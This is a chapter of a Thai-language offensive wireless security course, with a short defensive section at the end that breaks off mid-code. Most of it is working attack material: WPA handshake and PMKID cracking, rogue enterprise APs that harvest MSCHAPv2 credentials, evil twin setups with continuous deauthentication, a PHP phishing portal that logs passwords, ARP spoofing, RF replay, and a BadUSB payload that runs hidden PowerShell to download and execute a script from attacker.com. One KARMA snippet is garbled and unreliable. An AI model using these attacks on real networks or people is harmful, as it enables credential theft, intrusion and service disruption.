# Part 81: Wireless Security Advanced - ความปลอดภัยไร้สายขั้นสูง

← [Part 80: IoT Security](Part-80-IoT-Security.md) | [Part 82: Reverse Engineering](Part-82-Reverse-Engineering.md) →

---

## สารบัญ

1. [WiFi Security Fundamentals Review](#1-wifi-security-fundamentals-review)
2. [Advanced WPA2/WPA3 Attacks](#2-advanced-wpa2wpa3-attacks)
3. [Enterprise WiFi (WPA2-Enterprise)](#3-enterprise-wifi-wpa2-enterprise)
4. [Evil Twin และ KARMA Attacks](#4-evil-twin-และ-karma-attacks)
5. [Bluetooth Security](#5-bluetooth-security)
6. [RF Hacking](#6-rf-hacking)
7. [Advanced Wireless Exploitation](#7-advanced-wireless-exploitation)
8. [Wireless Defense](#8-wireless-defense)
9. [สรุปและ Lab Exercises](#9-สรุปและ-lab-exercises)

---

## 1. WiFi Security Fundamentals Review

### 1.1 Wireless Standards และ Security

```
WiFi Security Evolution:

┌─────────────────────────────────────────────┐
│ Protocol   Year  Security         Status       │
├─────────────────────────────────────────────┤
│ WEP        1997  RC4+CRC          BROKEN       │
│ WPA        2003  TKIP             WEAK         │
│ WPA2-PSK   2004  AES-CCMP         Vulnerable   │
│ WPA2-Ent   2004  EAP+AES          Moderate     │
│ WPA3-SAE   2018  Dragonfly/SAE    Stronger     │
│ WPA3-Ent   2018  EAP-TLS+192bit   Most Secure  │
└─────────────────────────────────────────────┘

WPA2-PSK (4-Way Handshake):

 Client (STA)             Access Point (AP)
     |                         |
     |<---- ANonce ------------|  1. AP sends random nonce
     |                         |
     |---- SNonce + MIC ------>|  2. Client sends nonce + MIC
     |                         |
     |<---- GTK + MIC ---------|  3. AP sends group key
     |                         |
     |------- ACK ------------>|  4. Client acknowledges
     |                         |
     +---------- Connected ----+

Capture handshake = crack PSK offline
```

### 1.2 Wireless Testing Setup

```bash
# ตรวจสอบ wireless adapter
iwconfig
airmon-ng check kill  # หยุด interfering processes

# Enable monitor mode
airmon-ng start wlan0
# Output: interface wlan0mon created

# หรือแบบ manual
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up

# ตรวจสอป mode
iwconfig wlan0

# Scan หาเครือข่าย
# (-w = write, -b = BSSID filter)
airodump-ng wlan0mon
airodump-ng wlan0mon -w capture --write-interval 1

# Capture หนึ่งเครือข่าย
airodump-ng wlan0mon -c 6 --bssid AA:BB:CC:DD:EE:FF -w ap_capture
```

---

## 2. Advanced WPA2/WPA3 Attacks

### 2.1 PMKID Attack (Hashcat)

```bash
# PMKID Attack - ไม่ต้องรอ client!
# (Discovered 2018, เร็วกว่า 4-way handshake attack)

# 1. Install hcxtools
apt-get install hcxdumptool hcxtools

# 2. Capture PMKID
hcxdumptool -i wlan0mon -o pmkid_capture.pcapng \
    --enable_status=1 \
    -F  # filter only EAPOLs

# 3. Convert to hashcat format
hcxpcapngtool -o pmkid.22000 pmkid_capture.pcapng

# หรือ
hcxpcapngtool -o wpa.hc22000 pmkid_capture.pcapng

# 4. Crack with hashcat
hashcat -m 22000 pmkid.22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 pmkid.22000 /usr/share/wordlists/rockyou.txt -r rules/best64.rule

# GPU acceleration
hashcat -m 22000 pmkid.22000 /usr/share/wordlists/rockyou.txt \
    -d 1 -w 3 --status

# 5. สร้าง wordlist จาก pattern
hashcat -m 22000 pmkid.22000 -a 3 ?d?d?d?d?d?d?d?d  # 8 digits
hashcat -m 22000 pmkid.22000 -a 3 Password?d?d  # Password + 2 digits

# ================================================
# Classic 4-Way Handshake Attack
# ================================================

# 1. Deauth client เพื่อ capture handshake
aireplay-ng -0 5 -a AP_BSSID -c CLIENT_MAC wlan0mon

# 2. Capture handshake
airodump-ng -c CHANNEL --bssid AP_BSSID -w handshake wlan0mon
# รอจนเห็น "WPA handshake: AP_BSSID"

# 3. ตรวจสอบ handshake
aircrack-ng handshake.cap

# 4. Crack
aircrack-ng handshake.cap -w /usr/share/wordlists/rockyou.txt

# Convert to hashcat format
hcxpcapngtool -o wpa.hc22000 handshake.cap
hashcat -m 22000 wpa.hc22000 /usr/share/wordlists/rockyou.txt
```

### 2.2 WPA3 Dragonblood Attack

```bash
# WPA3 Dragonblood (CVE-2019-9494)
# Side-channel attack ต่อ SAE handshake

# Install Dragonslayer tool
git clone https://github.com/vanhoefm/dragonslayer
cd dragonslayer
pip3 install -r requirements.txt

# 1. Downgrade attack (force WPA2)
# สร้าง AP ที่อ้างว่าเป็น WPA2 only
hostapd /etc/hostapd/wpa2_only.conf &

# 2. Cache-based side channel
python3 dragonslayer.py wlan0mon target_bssid --attack cache

# 3. Timing side channel
python3 dragonslayer.py wlan0mon target_bssid --attack timing

# Note: Most modern devices ได้แพตช์ Dragonblood แล้ว
# ยังคงทดสอบ downgrade attacks ได้

# ================================================
# KRACK Attack (CVE-2017-13077) - Key Reinstallation
# ================================================

# แค่ vulnerable ใน unpatched devices
pip3 install wpa-sec
git clone https://github.com/vanhoefm/krackattacks-scripts
cd krackattacks-scripts
python3 krack-ft-test.py
```

### 2.3 Advanced Wordlist Generation

```bash
# ================================================
# CUPP - Common User Password Profiler
# ================================================

pip3 install cupp
cupp -i  # interactive mode

# ================================================
# Mentalist - GUI wordlist generator
# ================================================

pip3 install mentalist

# ================================================
# hashcat rules
# ================================================

# สร้าง wordlist จาก rules
hashcat -m 22000 pmkid.22000 rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule \
    -r /usr/share/hashcat/rules/toggles1.rule

# Custom rules
cat > wifi_rules.rule << 'EOF'
# Append numbers
$1
$12
$123
$1234
# Capitalize first
c
# l33t speak
sa4
se3
io0
EOF

hashcat -m 22000 pmkid.22000 rockyou.txt -r wifi_rules.rule

# ================================================
# John the Ripper สำหรับ WPA
# ================================================

aircrack-ng -J hc22000_for_john handshake.cap
john hc22000_for_john.hccap --wordlist=rockyou.txt
john hc22000_for_john.hccap --rules=All --wordlist=rockyou.txt
```

---

## 3. Enterprise WiFi (WPA2-Enterprise)

### 3.1 EAP Methods

```
EAP Methods และ Security:

┌─────────────────────────────────────────────┐
│ Method         Security     Attack Possible │
├─────────────────────────────────────────────┤
│ EAP-MD5        Very Weak    Yes (plaintext)  │
│ LEAP           Weak         Yes (dictionary) │
│ EAP-FAST       Moderate     Yes (PAC)        │
│ PEAP           Good         MITM possible    │
│ EAP-TTLS       Good         MITM possible    │
│ EAP-TLS        Strong       Cert compromise  │
└─────────────────────────────────────────────┘

PEAP Authentication Flow:

 Client            Fake AP              Real AP/RADIUS
   |                  |                      |
   |--- Association ->|                      |
   |                  |                      |
   |<-- EAP Request --|                      |
   |--- EAP Response->|  (tunnel inner auth) |
   |                  |--- Forward to RADIUS ->
   |<-- Challenge ----|                      |
   |--- Response ---->|  CAPTURE HERE!       |
```

### 3.2 EAP Attack ด้วย hostapd-wpe

```bash
# ================================================
# hostapd-wpe - Rogue AP สำหรับ WPA Enterprise
# ================================================

# Install
apt-get install hostapd-wpe

# ตั้งค่า hostapd-wpe.conf
cat > /etc/hostapd-wpe/hostapd-wpe.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=CorpWiFi        # ชื่อเดียวกับ target
hw_mode=g
channel=6
wpa=2
eap_user_file=/etc/hostapd/hostapd.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=
dh_file=/etc/hostapd-wpe/certs/dh
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP TKIP
auth_algs=3
EOF

# Start rogue AP
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf

# ผลลัพธ์ที่ได้:
# mschapv2: username=user@corp.com
#            challenge=...
#            response=...

# ================================================
# Crack MSCHAPv2 credentials
# ================================================

# ใช้ asleap
asleap -C CHALLENGE -R RESPONSE -W wordlist.txt

# ใช้ hashcat
# format: netntlmv2_hash
hashcat -m 5500 netntlmv2.txt wordlist.txt  # NTLMv1
hashcat -m 5600 netntlmv2.txt wordlist.txt  # NTLMv2

# ================================================
# EAPHammer - Advanced Enterprise Attack
# ================================================

git clone https://github.com/s0lst1c3/eaphammer
cd eaphammer
pip3 install -r requirements.txt
python3 setup.py

# Generate certs
python3 eaphammer --cert-wizard

# Rogue AP attack
python3 eaphammer -i wlan0 \
    --channel 6 \
    --auth wpa-eap \
    --essid "CorpWiFi" \
    --creds

# Hostile portal attack
python3 eaphammer -i wlan0 \
    --channel 6 \
    --auth open \
    --essid "CorpWiFi" \
    --hostile-portal
```

---

## 4. Evil Twin และ KARMA Attacks

### 4.1 Evil Twin Attack

```bash
# ================================================
# Evil Twin - Rogue AP Attack
# ================================================

# เครื่องมือที่ต้องการ:
# - 2 wireless adapters (1 สำหรับ monitor, 1 สำหรับ AP)
# - hostapd
# - dnsmasq
# - mitmproxy/bettercap

# Step 1: ค้นหา target AP
airodump-ng wlan0mon
# Note: SSID, BSSID, Channel, Security

# Step 2: Clone AP
cat > /tmp/evil_twin.conf << 'EOF'
interface=wlan1
driver=nl80211
ssid=TargetNetwork      # ชื่อเดียวกับ target
hw_mode=g
channel=6               # Channel เดียวกัน
EOF

# Step 3: Setup DHCP
cat > /tmp/dnsmasq_evil.conf << 'EOF'
interface=wlan1
dhcp-range=192.168.100.2,192.168.100.254,24h
dhcp-option=3,192.168.100.1
dhcp-option=6,192.168.100.1
address=/#/192.168.100.1
EOF

# Step 4: Configure interface
ip addr add 192.168.100.1/24 dev wlan1
ip link set wlan1 up

# Step 5: Internet sharing (optional - to avoid detection)
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sysctl net.ipv4.ip_forward=1

# Step 6: Start AP
hostapd /tmp/evil_twin.conf &
dnsmasq -C /tmp/dnsmasq_evil.conf

# Step 7: Deauth clients จาก real AP
aireplay-ng -0 0 -a REAL_AP_BSSID wlan0mon  # continuous deauth

# Step 8: Capture credentials
mitmproxy -i wlan1 --mode transparent -p 8080
# หรือ
bettercap -iface wlan1 -eval "set http.proxy.injectjs window.alert('PWNed!'); http.proxy on"

# ================================================
# Automated Evil Twin with airbase-ng
# ================================================

# สร้าง fake AP
airbase-ng -e "TargetNetwork" -c 6 wlan0mon

# Setup bridge
brctl addbr br0
brctl addif br0 eth0
brctl addif br0 at0  # airbase interface
ifconfig br0 up
dhclient br0
```

### 4.2 KARMA Attack และ Captive Portal

```bash
# ================================================
# KARMA Attack - ตอบ Probe Requests ทุก SSID
# ================================================

# Devices ส่ง Probe Request หา known networks
# KARMA AP ตอบ Probe Request ทุกอัน
# Devices เชื่อมต่อโดยไม่รู้

# ใช้ Hostapd-WPE (built-in KARMA support)
cobalt_strike_config:
  - enable_karma: true

# ใช้ WiFi-Pumpkin
pip3 install wifi-pumpkin3
wifi-pumpkin3

# ใช้ airbase-ng สำหรับ KARMA
airbase-ng -P -C 60 wlan0mon  # -P = respond to all probes

# ================================================
# Captive Portal Attack
# ================================================

# Install Wifiphisher
apt-get install wifiphisher
# หรือ
pip3 install wifiphisher

# Basic captive portal
wifiphisher --essid "FreeWiFi" \
    --phishing-pages credential_harvest

# Specific target
wifiphisher -aI wlan0 -jI wlan1 \
    -p oauth-login \
    --force-hostapd \
    -nD

# Custom phishing page
wifiphisher --essid "FreeHotelWiFi" \
    -p firmware-upgrade  # fake firmware update

# ================================================
# Social Engineering Portal
# ================================================

# Setup portal ด้วย PHP
mkdir -p /var/www/html/portal

cat > /var/www/html/portal/index.php << 'EOF'
<?php
// Captive Portal Login Page
if ($_POST['username'] && $_POST['password']) {
    $log = date('Y-m-d H:i:s') . " | " . 
           $_SERVER['REMOTE_ADDR'] . " | " .
           $_POST['username'] . " | " .
           $_POST['password'] . "\n";
    file_put_contents('/tmp/credentials.txt', $log, FILE_APPEND);
    header('Location: https://google.com');
    exit;
}
?>
<!DOCTYPE html>
<html>
<head><title>WiFi Login</title></head>
<body>
<h1>Hotel WiFi - Sign In</h1>
<form method="POST">
  <input type="text" name="username" placeholder="Email/Username"><br>
  <input type="password" name="password" placeholder="Password"><br>
  <button type="submit">Connect</button>
</form>
</body>
</html>
EOF

# Start web server
php -S 192.168.100.1:80 -t /var/www/html/portal

# Redirect all HTTP to portal
iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 \
    -j DNAT --to-destination 192.168.100.1:80
```

---

## 5. Bluetooth Security

### 5.1 Bluetooth Attack Types

```
Bluetooth Attack Types:

1. Bluejacking
   - ส่ง unsolicited messages
   - ไม่ขโมยข้อมูล เพียงรบกวน

2. Bluesnarfing
   - ขโมยข้อมูลจาก device
   - Contacts, calendar, SMS

3. Bluebugging
   - เข้าควบคุม device
   - Make calls, read SMS

4. BlueBorne (CVE-2017-0781)
   - RCE ผ่าน Bluetooth
   - ไม่ต้อง pair!
   - Android/iOS/Linux/Windows

5. BIAS (CVE-2020-10135)
   - Bluetooth Impersonation Attack
   - Bypass Secure Connection

6. BLESA (BLE Spoofing)
   - BLE reconnection vulnerability
   - Spoof paired device

7. KNOB (CVE-2019-9506)
   - Key Negotiation of Bluetooth
   - Force weak 1-byte entropy
```

### 5.2 Bluetooth Testing Commands

```bash
# ================================================
# Bluetooth Discovery
# ================================================

# ตรวจสอบ BT interface
hciconfig
hciconfig hci0 up

# Scan devices
hcitool scan       # Classic Bluetooth
hcitool lescan     # BLE
bluetooth-ctl scan on

# Device info
hcitool info <BD_ADDR>
btmgmt info

# ================================================
# Bluetooth Enumeration
# ================================================

# sdptool - Service Discovery Protocol
sdptool browse <BD_ADDR>  # List services
sdptool browse --tree <BD_ADDR>  # Full tree

# ================================================
# BlueMaho - Bluetooth Testing Framework
# ================================================

apt-get install bluemaho
bluemaho.py

# ================================================
# Bluesnarfer
# ================================================

apt-get install bluesnarfer
# อ่าน contacts
bluesnarfer -r 1-100 -b <BD_ADDR>

# ================================================
# BlueBorne Testing
# ================================================

git clone https://github.com/ArmisSecurity/blueborne
cd blueborne

# Test Linux vulnerability
python3 bluetooth_test.py <target_ip> <bd_addr> linux

# ================================================
# BLE Testing ด้วย gatttool
# ================================================

# Connect to BLE device
gatttool -b AA:BB:CC:DD:EE:FF -I
# > connect
# > primary
# > characteristics
# > char-read-hnd 0x0003
# > char-write-cmd 0x0010 ff

# ================================================
# BLE Security Testing ด้วย btle-sniffer
# ================================================

pip3 install btle-sniffer
btle_sniffer -i hci0 -v
```

### 5.3 Python BLE Testing Script

```python
#!/usr/bin/env python3
# ble_tester.py - BLE Security Testing

import asyncio
from bleak import BleakClient, BleakScanner
from typing import List, Optional

class BLESecurityTester:
    """BLE Security Tester"""
    
    def __init__(self):
        self.devices = []
        self.findings = []
    
    async def scan_devices(self, timeout: float = 10.0) -> List:
        """Scan สำหรับ BLE devices"""
        print(f"[*] Scanning for BLE devices ({timeout}s)...")
        
        devices = await BleakScanner.discover(timeout=timeout)
        
        for device in devices:
            print(f"  [{device.address}] {device.name or 'Unknown'}")
            print(f"      RSSI: {device.rssi}")
            if device.metadata.get('manufacturer_data'):
                print(f"      Manufacturer: {device.metadata['manufacturer_data']}")
        
        self.devices = devices
        return devices
    
    async def enumerate_services(self, address: str) -> dict:
        """Enumerate GATT services และ characteristics"""
        print(f"[*] Enumerating services for {address}")
        services = {}
        
        try:
            async with BleakClient(address) as client:
                print(f"[+] Connected to {address}")
                
                for service in client.services:
                    services[service.uuid] = {
                        'handle': service.handle,
                        'description': service.description,
                        'characteristics': []
                    }
                    
                    for char in service.characteristics:
                        char_info = {
                            'handle': char.handle,
                            'uuid': str(char.uuid),
                            'properties': char.properties,
                            'value': None
                        }
                        
                        # Try to read
                        if 'read' in char.properties:
                            try:
                                value = await client.read_gatt_char(char.uuid)
                                char_info['value'] = value.hex()
                                print(f"  [+] Read {char.uuid}: {value.hex()}")
                                
                                # ตรวจสอบ sensitive data
                                try:
                                    text = value.decode('utf-8', errors='ignore')
                                    if any(s in text.lower() for s in 
                                           ['password', 'key', 'secret', 'token']):
                                        self.findings.append({
                                            'type': 'Sensitive data in BLE',
                                            'handle': char.handle,
                                            'value': text
                                        })
                                except Exception:
                                    pass
                            except Exception as e:
                                pass
                        
                        services[service.uuid]['characteristics'].append(char_info)
                        
                        # Check notify (for passive monitoring)
                        if 'notify' in char.properties:
                            print(f"  [!] Notify available: {char.uuid}")
        
        except Exception as e:
            print(f"[-] Error: {e}")
        
        return services
    
    async def test_write_without_auth(self, address: str) -> List:
        """ทดสอบ write ที่ไม่ต้อง authenticate"""
        findings = []
        
        try:
            async with BleakClient(address) as client:
                for service in client.services:
                    for char in service.characteristics:
                        if 'write' in char.properties or \
                           'write-without-response' in char.properties:
                            # ทดสอบ write ด้วย test values
                            test_payloads = [
                                b'\x01',
                                b'\x00',
                                b'\xFF',
                                b'test',
                            ]
                            
                            for payload in test_payloads:
                                try:
                                    await client.write_gatt_char(
                                        char.uuid, payload,
                                        response=False
                                    )
                                    print(f"[!] WRITE SUCCESS (no auth): {char.uuid} = {payload.hex()}")
                                    findings.append({
                                        'char': str(char.uuid),
                                        'payload': payload.hex()
                                    })
                                    break
                                except Exception:
                                    pass
        except Exception as e:
            print(f"[-] Error: {e}")
        
        return findings


async def main():
    tester = BLESecurityTester()
    
    # Scan
    devices = await tester.scan_devices(timeout=15)
    
    if not devices:
        print("[-] No BLE devices found")
        return
    
    # Test first device
    target = devices[0].address
    print(f"\n[*] Testing device: {target}")
    
    # Enumerate
    services = await tester.enumerate_services(target)
    
    # Test writes
    write_findings = await tester.test_write_without_auth(target)
    
    print(f"\n[+] Findings: {len(tester.findings) + len(write_findings)}")

if __name__ == '__main__':
    asyncio.run(main())
```

---

## 6. RF Hacking

### 6.1 Software Defined Radio (SDR)

```bash
# ================================================
# SDR Setup สำหรับ RF Analysis
# ================================================

# Hardware:
# - RTL-SDR (ถูก, $25) - รับอย่างเดียว
# - HackRF One ($300) - รับ/ส่ง
# - YARD Stick One ($100) - Sub-GHz
# - Flipper Zero ($200) - all-in-one

# Install SDR tools
apt-get install rtl-sdr gqrx-sdr gnuradio

# ทดสอบ RTL-SDR
rtl_test
rtl_sdr -f 433920000 -s 2048000 /tmp/rf_capture.raw

# ================================================
# GQRX - Visual RF Analysis
# ================================================

gqrx
# - เปิด Device: RTL2838U
# - ตั้ง Frequency: 433.92 MHz (ISM band)
# - ตั้ง Sample Rate: 2.048 MHz
# - กด Play

# ================================================
# rtl_433 - Decode 433MHz Sensors
# ================================================

pip3 install rtl-433
rtl_433 -f 433920000
# Output: decode sensor data (temperature, humidity, etc.)

# ================================================
# Universal Radio Hacker (URH)
# ================================================

pip3 install urh
urh  # GUI tool

# หรือ command line
urh simulate --encoding NRZ --freq 433920000

# ================================================
# Replay Attack
# ================================================

# 1. Record signal
rtl_sdr -f 433920000 -s 2048000 -n 1000000 garage_open.raw

# 2. Analyze ด้วย URH
urh garage_open.raw

# 3. Replay ด้วย HackRF
hackrf_transfer -t garage_open.raw -f 433920000 \
    -s 2048000 -x 40

# ================================================
# GNU Radio flow
# ================================================

# Install GNU Radio
apt-get install gnuradio gr-osmosdr

# Python GNU Radio script
python3 << 'EOF'
import osmosdr
from gnuradio import gr, blocks

class RF_Recorder(gr.top_block):
    def __init__(self):
        gr.top_block.__init__(self)
        
        # Source
        src = osmosdr.source(args='numchan=1 rtl=0')
        src.set_sample_rate(2048000)
        src.set_center_freq(433920000)
        src.set_gain(40)
        
        # Sink (ไฟล์)
        sink = blocks.file_sink(gr.sizeof_gr_complex * 1,
                                '/tmp/recording.iq')
        
        self.connect(src, sink)

rec = RF_Recorder()
rec.run()
EOF
```

### 6.2 Flipper Zero Usage

```bash
# ================================================
# Flipper Zero - Swiss Army Knife for RF Hacking
# ================================================

# Capabilities:
# - 125kHz (RFID): HID, EM4100, Indala
# - 13.56MHz (NFC): Mifare, NTAG, EMV
# - Sub-GHz (300-928MHz): replay, analyze
# - Infrared: replay TV remotes
# - iButton/1-Wire: read/write
# - GPIO/UART/SPI/I2C via pins
# - Bad USB: HID attack

# ================================================
# Sub-GHz Attack (การจับสัญญาณ)
# ================================================
# Via Flipper UI:
# Main > Sub-GHz > Read
# กด button บน garage door/car key
# Flipper จะจับสัญญาณ
# Main > Sub-GHz > Saved > Send

# ================================================
# NFC/RFID Cloning
# ================================================
# Main > NFC > Read
# วาง card บน Flipper
# บันทึกและ emulate

# ================================================
# Bad USB (HID Attack)
# ================================================
# สร้าง payload file
cat > badusb_payload.txt << 'EOF'
DELAY 500
GUI r
DELAY 500
STRING powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
ENTER
EOF

# Upload ไปยัง Flipper ผ่าน CLI
flipperc cli -d /dev/ttyACM0
```

---

## 7. Advanced Wireless Exploitation

### 7.1 Aircrack-ng Suite

```bash
# ================================================
# Advanced Aircrack-ng Techniques
# ================================================

# 1. WEP Cracking (legacy)
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon
aireplay-ng -1 0 -e ESSID -b BSSID wlan0mon  # fake auth
aireplay-ng -3 -b BSSID -h OUR_MAC wlan0mon  # ARP injection
aircrack-ng wep_capture.cap

# 2. WPS Attack
# Install reaver
apt-get install reaver

# Scan WPS networks
wash -i wlan0mon

# Pixie Dust attack (faster)
reaver -i wlan0mon -b BSSID -K 1 -vv

# Brute force (slow, may lock)
reaver -i wlan0mon -b BSSID -vv

# ใช้ bully (alternative)
bully -b BSSID wlan0mon -d -v 3

# 3. PMKID + Hashcat pipeline
hcxdumptool -i wlan0mon --enable_status=3 \
    -o capture.pcapng --filterlist_ap=targets.txt
hcxpcapngtool capture.pcapng -o hashes.hc22000
hashcat -m 22000 hashes.hc22000 rockyou.txt

# 4. Monitor multiple channels
for channel in 1 6 11 36 40 44 48; do
    airodump-ng -c $channel wlan0mon -w ch${channel}_capture &
done

# ================================================
# Wireless MitM ด้วย bettercap
# ================================================

bettercap -iface wlan0 -eval "
    wifi.recon on;
    set wifi.show.manufacturer true;
    wifi.deauth all;
    set arp.spoof.targets 192.168.1.0/24;
    arp.spoof on;
    net.sniff on"
```

### 7.2 Python Wireless Script

```python
#!/usr/bin/env python3
# wireless_recon.py - Wireless Reconnaissance

from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq
from collections import defaultdict
import time
import threading

class WirelessRecon:
    """Wireless Network Reconnaissance"""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.networks = {}
        self.clients = defaultdict(set)
        self.probe_requests = defaultdict(set)
        self.handshakes = {}
    
    def start_capture(self, timeout: int = 60):
        """เริ่ม packet capture"""
        print(f"[*] Starting capture on {self.interface} for {timeout}s")
        
        def hop_channels():
            """Channel hopping"""
            channels = [1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 5, 10]
            idx = 0
            while True:
                os.system(f"iwconfig {self.interface} channel {channels[idx]}")
                idx = (idx + 1) % len(channels)
                time.sleep(0.5)
        
        # Channel hopping thread
        hop_thread = threading.Thread(target=hop_channels, daemon=True)
        hop_thread.start()
        
        # Capture
        sniff(
            iface=self.interface,
            prn=self._process_packet,
            timeout=timeout,
            store=False
        )
    
    def _process_packet(self, pkt):
        """Process captured packets"""
        
        # Beacon frames - APs
        if pkt.haslayer(Dot11Beacon):
            self._process_beacon(pkt)
        
        # Probe Requests - clients looking for networks
        elif pkt.haslayer(Dot11ProbeReq):
            self._process_probe(pkt)
        
        # EAPOL frames - handshakes
        elif pkt.haslayer(EAPOL):
            self._process_eapol(pkt)
    
    def _process_beacon(self, pkt):
        """Extract AP information from beacon"""
        bssid = pkt[Dot11].addr3
        
        # Extract SSID
        ssid = ''
        rssi = -100
        capabilities = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}")
        
        channel = 0
        encryption = 'Open'
        
        # Parse elements
        elt = pkt[Dot11Elt]
        while elt:
            if elt.ID == 0:  # SSID
                ssid = elt.info.decode('utf-8', errors='replace')
            elif elt.ID == 3:  # Channel
                channel = ord(elt.info)
            elif elt.ID == 48:  # RSN (WPA2)
                encryption = 'WPA2'
            elif elt.ID == 221:  # Vendor (WPA)
                if b'\x00\x50\xf2\x01' in elt.info:
                    encryption = 'WPA'
            
            try:
                elt = elt.payload[Dot11Elt]
            except Exception:
                break
        
        # RSSI
        if hasattr(pkt, 'dBm_AntSignal'):
            rssi = pkt.dBm_AntSignal
        
        # WEP check
        if 'privacy' in capabilities and encryption == 'Open':
            encryption = 'WEP'
        
        if bssid not in self.networks:
            self.networks[bssid] = {
                'ssid': ssid or '(hidden)',
                'bssid': bssid,
                'channel': channel,
                'encryption': encryption,
                'rssi': rssi,
                'clients': 0
            }
            print(f"[+] AP: {ssid or '(hidden)':30s} {bssid}  Ch:{channel}  {encryption}  {rssi}dBm")
        
        # Update RSSI
        self.networks[bssid]['rssi'] = rssi
    
    def _process_probe(self, pkt):
        """Track probe requests (clients looking for networks)"""
        client_mac = pkt[Dot11].addr2
        
        try:
            ssid = pkt[Dot11Elt].info.decode('utf-8', errors='replace')
        except Exception:
            ssid = ''
        
        if ssid and ssid not in self.probe_requests[client_mac]:
            self.probe_requests[client_mac].add(ssid)
            print(f"[!] Probe: {client_mac} looking for '{ssid}'")
    
    def _process_eapol(self, pkt):
        """Detect WPA handshakes"""
        bssid = pkt[Dot11].addr3
        
        if bssid not in self.handshakes:
            self.handshakes[bssid] = {'frames': 0, 'captured': False}
        
        self.handshakes[bssid]['frames'] += 1
        
        if self.handshakes[bssid]['frames'] >= 2 and \
           not self.handshakes[bssid]['captured']:
            ssid = self.networks.get(bssid, {}).get('ssid', bssid)
            print(f"[!] WPA Handshake captured: {ssid} ({bssid})")
            self.handshakes[bssid]['captured'] = True
    
    def show_summary(self):
        """แสดงสรุปผล"""
        print("\n" + "="*60)
        print("Wireless Reconnaissance Summary")
        print("="*60)
        
        print(f"\nNetworks Found: {len(self.networks)}")
        
        # Group by encryption
        by_enc = defaultdict(list)
        for net in self.networks.values():
            by_enc[net['encryption']].append(net)
        
        for enc, nets in by_enc.items():
            print(f"  {enc}: {len(nets)} networks")
        
        print(f"\nClients: {len(self.probe_requests)} unique")
        print(f"Handshakes: {sum(1 for h in self.handshakes.values() if h['captured'])}")
        
        # High value targets
        print("\nHigh Value Targets:")
        for bssid, net in self.networks.items():
            if net['encryption'] in ['WEP', 'WPA']:
                print(f"  [WEAK] {net['ssid']} ({bssid}) - {net['encryption']}")
        
        # Clients looking for networks
        if self.probe_requests:
            print("\nVulnerable Clients (Probe Requests):")
            for mac, ssids in list(self.probe_requests.items())[:5]:
                print(f"  {mac}: {', '.join(list(ssids)[:3])}")


if __name__ == '__main__':
    recon = WirelessRecon('wlan0mon')
    recon.start_capture(timeout=120)
    recon.show_summary()
```

---

## 8. Wireless Defense

### 8.1 Detection และ Prevention

```python
#!/usr/bin/env python3
# wireless_ids.py - Wireless Intrusion Detection

from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Disas
from collections import defaultdict
import time
import logging

logging.basicConfig(level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')
log = logging.getLogger(__name__)

class WirelessIDS:
    """Wireless Intrusion Detection System"""
    
    def __init__(self, interface: str, protected_networks: list = None):
        self.interface = interface
        self.protected_networks = protected_networks or []
        
        # Tracking
        self.deauth_count = defaultdict(lambda: {'count': 0, 'first': time.time()})
        self.probe_flood = defaultdict(int)
        self.known_aps = {}  # legitimate APs
        self.alerts = []
    
    def start_monitoring(self):
        """เริ่ม monitoring"""
        print(f"[*] Starting Wireless IDS on {self.interface}")
        sniff(
            iface=self.interface,
            prn=self._analyze_packet,
            store=False
        )
    
    def _analyze_packet(self, pkt):
        """Analyze ทุก packet"""
        
        # Detect Deauth Flood (possible deauth attack)
        if pkt.haslayer(Dot11Deauth) or pkt.haslayer(Dot11Disas):
            self._detect_deauth_attack(pkt)
        
        # Detect Evil Twin (duplicate SSID with different BSSID)
        elif pkt.haslayer(Dot11Beacon):
            self._detect_evil_twin(pkt)
        
        # Detect Probe Flood
        elif pkt.haslayer(Dot11ProbeReq):
            self._detect_probe_flood(pkt)
    
    def _detect_deauth_attack(self, pkt):
        """ตรวจจับ deauthentication flood"""
        src = pkt[Dot11].addr2
        dst = pkt[Dot11].addr1
        bssid = pkt[Dot11].addr3
        
        key = f"{src}->{bssid}"
        self.deauth_count[key]['count'] += 1
        
        # Alert ถ้าเกิน 10 frames ใน 5 วินาที
        now = time.time()
        window = now - self.deauth_count[key]['first']
        
        if window > 5:  # Reset window
            self.deauth_count[key] = {'count': 1, 'first': now}
        elif self.deauth_count[key]['count'] > 10:
            alert = {
                'type': 'DEAUTH_FLOOD',
                'severity': 'HIGH',
                'src': src,
                'bssid': bssid,
                'count': self.deauth_count[key]['count'],
                'timestamp': now
            }
            self._raise_alert(alert)
            self.deauth_count[key]['count'] = 0  # Reset after alert
    
    def _detect_evil_twin(self, pkt):
        """ตรวจจับ Evil Twin AP"""
        bssid = pkt[Dot11].addr3
        
        # Extract SSID
        try:
            ssid = pkt[Dot11Elt].info.decode('utf-8', errors='replace')
        except Exception:
            return
        
        if not ssid or ssid == '':  # Skip hidden
            return
        
        # ตรวจสอบ SSID ที่ protected
        if ssid in self.protected_networks:
            if ssid not in self.known_aps:
                # First time seen
                self.known_aps[ssid] = bssid
            elif self.known_aps[ssid] != bssid:
                # Same SSID, different BSSID = Evil Twin!
                alert = {
                    'type': 'EVIL_TWIN',
                    'severity': 'CRITICAL',
                    'ssid': ssid,
                    'legitimate_bssid': self.known_aps[ssid],
                    'rogue_bssid': bssid,
                    'timestamp': time.time()
                }
                self._raise_alert(alert)
    
    def _detect_probe_flood(self, pkt):
        """ตรวจจับ probe request flood"""
        src = pkt[Dot11].addr2
